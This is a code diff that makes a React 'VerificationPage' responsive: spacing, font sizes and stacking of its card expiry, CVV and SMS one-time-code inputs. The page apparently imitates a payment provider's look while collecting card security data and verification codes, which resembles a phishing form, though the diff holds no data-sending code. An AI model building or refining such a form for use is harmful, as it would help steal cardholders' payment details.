@@ -96,12 +96,12 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   };
 
   const renderTopBar = () => (
-    <div className="w-full max-w-[480px] mt-8 px-4">
-      <div className="bg-[#f5f7fa] rounded-full px-6 py-3 flex items-center justify-between border border-gray-100">
-        <span className="text-[15px] text-gray-700 truncate mr-2">{email}</span>
+    <div className="w-full max-w-[480px] mt-4 sm:mt-8 px-4 sm:px-6">
+      <div className="bg-[#f5f7fa] rounded-full px-4 sm:px-6 py-2 sm:py-3 flex items-center justify-between border border-gray-100">
+        <span className="text-[13px] sm:text-[15px] text-gray-700 truncate mr-2">{email}</span>
         <button 
           onClick={onBack}
-          className="text-[#0070BA] font-bold text-[15px] hover:underline shrink-0"
+          className="text-[#0070BA] font-bold text-[13px] sm:text-[15px] hover:underline shrink-0"
         >
           Change
         </button>
@@ -110,7 +110,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   );
 
   const renderFooter = () => (
-    <div className="flex items-center gap-6 text-[13px] font-semibold text-gray-600 border-t border-gray-100 pt-8 w-full justify-center mt-auto pb-8">
+    <div className="flex flex-wrap items-center gap-4 sm:gap-6 text-[12px] sm:text-[13px] font-semibold text-gray-600 border-t border-gray-100 pt-8 w-full justify-center mt-auto pb-8 px-4">
       <a href="#" className="hover:underline">Contact Us</a>
       <a href="#" className="hover:underline">Privacy</a>
       <a href="#" className="hover:underline">Legal</a>
@@ -144,26 +144,26 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
                   className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                 />
               </div>
-              <div className="flex gap-4">
-                <div className="flex-1 relative">
-                  <input
-                    type="text"
-                    value={expiryDate}
-                    onChange={(e) => setExpiryDate(e.target.value)}
-                    placeholder="Expiry date"
-                    className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
-                  />
-                </div>
-                <div className="flex-1 relative">
-                  <input
-                    type="text"
-                    value={cvv}
-                    onChange={(e) => setCvv(e.target.value)}
-                    placeholder="CVV"
-                    className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
-                  />
-                </div>
+            <div className="flex flex-col sm:flex-row gap-4 mb-8 w-full">
+              <div className="flex-1 relative">
+                <input
+                  type="text"
+                  value={expiryDate}
+                  onChange={(e) => setExpiryDate(e.target.value)}
+                  placeholder="Expiry date"
+                  className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
+                />
               </div>
+              <div className="flex-1 relative">
+                <input
+                  type="text"
+                  value={cvv}
+                  onChange={(e) => setCvv(e.target.value)}
+                  placeholder="CVV"
+                  className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
+                />
+              </div>
+            </div>
             </div>
             <button 
               type="submit"
@@ -203,14 +203,14 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
             <p className="text-[16px] text-gray-900 mb-8 self-start font-medium">
               +1 •••-•••-••••
             </p>
-            <div className="flex gap-2 mb-4 w-full justify-between">
+            <div className="flex gap-1.5 sm:gap-2 mb-4 w-full justify-between">
               {verificationCode.map((digit, i) => (
                 <input
                   key={i}
                   type="text"
                   maxLength={1}
                   value={digit}
-                  className="w-12 h-16 bg-[#f5f7fa] border-2 border-transparent rounded-lg text-center text-[24px] font-bold outline-none focus:bg-white focus:border-[#0070BA] transition-all"
+                  className="w-10 h-14 sm:w-12 sm:h-16 bg-[#f5f7fa] border-2 border-transparent rounded-lg text-center text-[20px] sm:text-[24px] font-bold outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                   onChange={(e) => {
                     const nextCode = [...verificationCode];
                     nextCode[i] = e.target.value;
